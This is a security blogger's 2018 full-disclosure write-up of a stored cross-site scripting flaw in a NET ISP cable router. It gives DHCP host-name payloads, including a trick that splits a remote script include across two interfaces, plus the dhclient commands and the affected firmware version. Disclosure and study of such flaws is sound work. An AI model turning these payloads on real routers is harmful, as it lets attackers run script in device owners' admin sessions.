<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>Gambler - Hacking and other stuffs</title>
    <meta name="description" content="Posts about hacking, coding and other stuffs" />

    <meta name="HandheldFriendly" content="True" />
    <meta name="MobileOptimized" content="320" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css" />
    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
    <!-- Customisation  -->
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css" />

</head>
<body class="home-template">

    <header class="main-header post-head no-cover">
    <nav class="main-nav  clearfix">
        <a class="back-button icon-arrow-left" href="/">Home</a>
        <a class="subscribe-button icon-feed" href="/feed.xml">Subscribe</a>
    </nav>
</header>

<main class="content" role="main">

    <article class="post">

        <header class="post-header">
            <h1 class="post-title">Hacking into NET router for fun and profit [FULL DISCLOSURE]</h1>
            <section class="post-meta">
                <time class="post-date" datetime="2018-03-02">02 Mar 2018</time>
                
                    on Persistence
                
            </section>
        </header>

<!--         <header class="post-header">
            <a id="blog-logo" href="https://mthbernardes.github.io">
                
                    <span class="blog-title">Gambler</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2018-03-02">02 Mar 2018</time>
            
                on Persistence
            
        </span> -->

        <!-- <h1 class="post-title">Hacking into NET router for fun and profit [FULL DISCLOSURE]</h1> -->

        <section class="post-content">
            <h4 id="hacking-into-net-router-for-fun-and-profit-full-disclosure">Hacking into NET router for fun and profit [FULL DISCLOSURE]</h4>
<p>Recently I moved to another city to live alone, and as needed I contract the only ISP available on my building, NET, one of the worst ISP on Brazil, they just decided to block all my output connections on port 22/ssh, but it’s another history.</p>

<p>I have an history with another <a href="https://www.exploit-db.com/exploits/42284/">NET router</a>, and as I was boring today and decided to create another history with net routers.</p>

<p>The first thing I tried on this new router was an command injection on ping function, it didn’t work, but gave the output of what a sent, so I realized that this router could allow a lot of XSS, the first place I tried, was on ping function again, but there was some control that did not allow me to sent especial characters, beyond that, it’s not a good place to get a xss, I need a XSS stored on this precious router, and then a holly light open my mind, and made me test the first page of the router, where they show the DHCP leases, this page contains, host name, ip address and mac address of each host, so I thought, maybe I could manipulate the host name of my host, and sent a malicious data, and in a simple Google search, I realized that I just need to change one line on dhclient config file (/etc/dhcp/dhclient.conf).</p>

<pre><code class="language-bash">send host-name = "&lt;script&gt;alert('HACKED')&lt;/script&gt;";
</code></pre>
<p>And for my sadness it didn’t work, I opened the html source, and saw that the last character wasn’t there, so I figured out, that there was a limit on the host name size only 31 characters, just to validate the XSS, I removed the HACKED string force the lease and it works and then my saga started to get something more interesting then a alert().</p>

<p>I create a payload.js hosted it on a VPS and tried a lot of techniques to make the content of this file executed by the browser, but none of then worked, I got close using the site <a href="https://l.ly">l.ly</a> to short my url, but because of only one character it didn’t work.</p>
<pre><code class="language-bash">send host-name = "&lt;script src=//l.ly/uXa&gt;&lt;/script&gt;";
</code></pre>

<p>So I thought in buy a short domain like l.ly and host my payload file named as 1, and my problem would be resolved, but it’s extremely expensive, and I don’t have money to do that, so after hours thinking the best way to do that, I realized how stupid I am, the only thing I need, is just another network interface, to create this output on the router.</p>
<pre><code class="language-html">&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;&lt;script src=//l.ly/uXa&gt;&lt;!--&lt;/td&gt;&lt;td&gt;f4:96:34:25:65:c5&lt;/td&gt;&lt;td&gt;192.168.0.44&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;--&gt;&lt;/script&gt;&lt;/script&lt;/td&gt;&lt;td&gt;f4:96:34:25:65:c5&lt;/td&gt;&lt;td&gt;192.168.0.44&lt;/td&gt;&lt;/tr&gt;

</code></pre>
<p>I just splitted the payload on my 2 interfaces, the first interface receives the follow payload,</p>
<pre><code class="language-bash">send host-name = "&lt;script src=//l.ly/uXa&gt;&lt;!--";
</code></pre>
<p>Where I have the start of the payload, and a HTML comment, to ignore everything after my tag script, and the second payload,</p>
<pre><code class="language-bash">send host-name = "--&gt;&lt;/script&gt;";
</code></pre>
<p>I just closed the comment, and inserted the end of the tag script, I forced the interfaces to lease the ip address and request again, and then I finally got my XSS payload been executed.</p>
<pre><code class="language-bash">dhclient -r &amp;&amp; dhclient
</code></pre>
<p><img src="/assets/images/router-hacked.png" alt="hacked" title="hacked" /></p>

<h4 id="about-the-router">About the router</h4>
<p>Below is information about the router</p>

<table>
  <thead>
    <tr>
      <th>Description</th>
      <th style="text-align: right">Version</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Technology</td>
      <td style="text-align: right">docsis 3.0</td>
    </tr>
    <tr>
      <td>Hardware Version</td>
      <td style="text-align: right">V2.00</td>
    </tr>
    <tr>
      <td>Software Version</td>
      <td style="text-align: right">09.89.17.23.03</td>
    </tr>
  </tbody>
</table>


        </section>

        

        <footer class="post-footer">
            <!-- If we want to display author's name and bio -->
            
                <figure class="author-image">
                    <a class="img" href="/" style="background-image: url(/assets/images/profile.png)">
                    <span class="hidden">Matheus Bernardes's Picture</span></a>
                </figure>
                <section class="author">
                    <!-- Author Name -->
                    <h4> Matheus Bernardes </h4>
                    <!-- Author Bio -->
                    <p>
                        Security consultant, Python programmer, CTF <a href="https://rtfm-ctf.org" target="_blank">RTFM</a> team player and an enthusiast (noob) in reverse engineering.
                    </p>
                </section>
            

            <!-- Share links section -->
            <section class="share">
    <h4>Share this post</h4>
    <a class="icon-twitter" href="http://twitter.com/share?text=Hacking into NET router for fun and profit [FULL DISCLOSURE]&amp;url=mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html"
        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html"
        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

            <!-- Disqus comments -->
            
                <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'gambler-1';
        var disqus_developer = 1; // developer mode is on
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>

            

        </footer>

    </article>

</main>


    <footer class="site-footer clearfix">
      <section class="copyright">
        <a href="/">Gambler</a> &copy;
              2018 &bull; All rights reserved.
              <script src="https://www.hackthebox.eu/badge/7591"></script>
      </section>
      <section class="poweredby">Made with Jekyll using
        <a href="http://github.com/rosario/kasper">Kasper theme</a>
      </section>
    </footer>

    <script type="text/javascript" src="/assets/js/jquery-1.11.1.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="/assets/js/index.js"></script>

    <!-- Google Analytics Tracking code -->
    <script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-68962388-2']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();

    </script>
</body>
</html>
